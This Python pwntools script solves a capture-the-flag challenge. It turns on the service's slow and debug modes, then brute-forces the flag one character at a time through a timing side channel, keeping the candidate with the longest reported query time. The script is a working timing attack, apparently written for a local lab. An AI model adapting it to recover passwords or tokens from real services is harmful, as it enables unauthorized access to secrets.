import re
import string
import sys

from pwn import *

# p = process("./docker/chall")
p = remote("localhost", 40124)

p.sendline(b"2")  # Options
p.sendline(b"1")  # Enable slow mode
p.sendline(b"5")  # Enable debug mode
p.sendline(b"0")  # Return to main menu

flag: str = ""


def time_flag_submission(test_flag: bytes) -> int:
    """
    Submit flag and check the response time from the debug info

    @param test_flag: Flag to test

    @returns An integer representing the time taken
    """
    p.sendline(b"1")  # Submit flag
    p.recvuntil(b"Enter flag:")
    p.sendline(test_flag)
    output = p.recvuntil(b"Enter action:")
    if b"Incorrect flag!" not in output:
        log.success("Correct flag: %s", test_flag.decode("utf-8"))
        sys.exit(0)
    query_time = re.search(rb"Total query time: (\d+)", output)
    if query_time:
        return int(query_time.group(1).decode("utf-8"))
    else:
        raise Exception("No timing info found")


while True:
    log.info("Current flag: %s", flag)
    times: dict[str, int] = {}
    for char in string.ascii_letters + string.digits + "{}_":
        flag_time = time_flag_submission((flag + char).encode("utf-8"))
        times[flag + char] = flag_time

    times_sorted = sorted(times.items(), key=lambda item: item[1], reverse=True)
    diff_to_second_best = times_sorted[0][1] - times_sorted[1][1]
    log.info("Diff: %d", diff_to_second_best)

    flag = times_sorted[0][0]  # Use best (slowest) character and continue
